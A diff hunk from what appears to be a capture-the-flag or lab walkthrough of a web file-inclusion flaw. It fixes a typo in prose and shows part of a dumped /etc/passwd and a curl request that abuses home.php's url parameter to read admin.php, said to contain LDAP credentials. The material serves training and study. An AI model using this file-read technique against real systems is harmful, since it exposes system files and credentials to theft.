@@ -190,7 +190,7 @@ zeus:x:1000:1000:,,,:/home/zeus:/bin/bash
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 ```
 
-It's worth also noting that php files don'e execute through this vulnerability, so a reverse shell can't be done. But reading php files is good because it means the admin.php file code can be retrieved, which appears to contain LDAP credentials.
+It's worth also noting that php files don't execute through this, so a reverse shell can't be done. But reading php files is good because it means the admin.php file code can be retrieved, which appears to contain LDAP credentials.
 ```bash
 ┌──(kali㉿kali)-[]-[~/Desktop]
 └─$ curl 'http://192.168.34.156/home.php?url=admin.php'
